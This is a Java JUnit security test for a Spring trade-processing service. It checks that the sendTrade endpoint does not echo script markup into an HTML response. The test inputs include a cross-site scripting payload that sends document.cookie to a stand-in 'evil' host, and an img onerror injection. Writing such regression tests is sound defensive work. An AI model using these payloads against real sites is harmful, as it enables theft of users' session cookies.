package com.Himanshu.TradesPostProcessingSystem.swarm;

import com.Himanshu.TradesPostProcessingSystem.controller.TradeController;
import com.Himanshu.TradesPostProcessingSystem.model.Trade;
import com.Himanshu.TradesPostProcessingSystem.service.TradeService;
import org.junit.jupiter.api.Tag;
import org.junit.jupiter.api.Test;
import org.springframework.kafka.core.KafkaTemplate;
import org.springframework.test.util.ReflectionTestUtils;
import org.springframework.test.web.servlet.MockMvc;
import org.springframework.test.web.servlet.MvcResult;
import org.springframework.test.web.servlet.setup.MockMvcBuilders;

import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.mockito.Mockito.mock;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.get;

/** INJECT-1: /api/trade/sendTrade reflects attacker-controlled symbol/account into a text/html response. */
@Tag("swarm")
class Inject1SwarmTest {

    @Test
    @SuppressWarnings("unchecked")
    void sendTradeDoesNotReflectScriptIntoHtml() throws Exception {
        TradeService service = new TradeService();
        ReflectionTestUtils.setField(service, "kafkaTemplate", mock(KafkaTemplate.class));
        TradeController controller = new TradeController();
        ReflectionTestUtils.setField(controller, "tradeService", service);
        MockMvc mvc = MockMvcBuilders.standaloneSetup(controller).build();

        String payload = "<script>fetch('//evil/'+document.cookie)</script>";
        MvcResult res = mvc.perform(get("/api/trade/sendTrade")
                        .header("Accept", "text/html")
                        .header("X-Account-Id", "<img src=x onerror=alert(1)>")
                        .param("symbol", payload)
                        .param("quantity", "10")
                        .param("price", "100"))
                .andReturn();

        String body = res.getResponse().getContentAsString();
        String type = String.valueOf(res.getResponse().getContentType());
        assertFalse(body.contains("<script>") || body.contains("<img"),
                "attacker markup reflected verbatim (Content-Type " + type + "): " + body);
    }
}
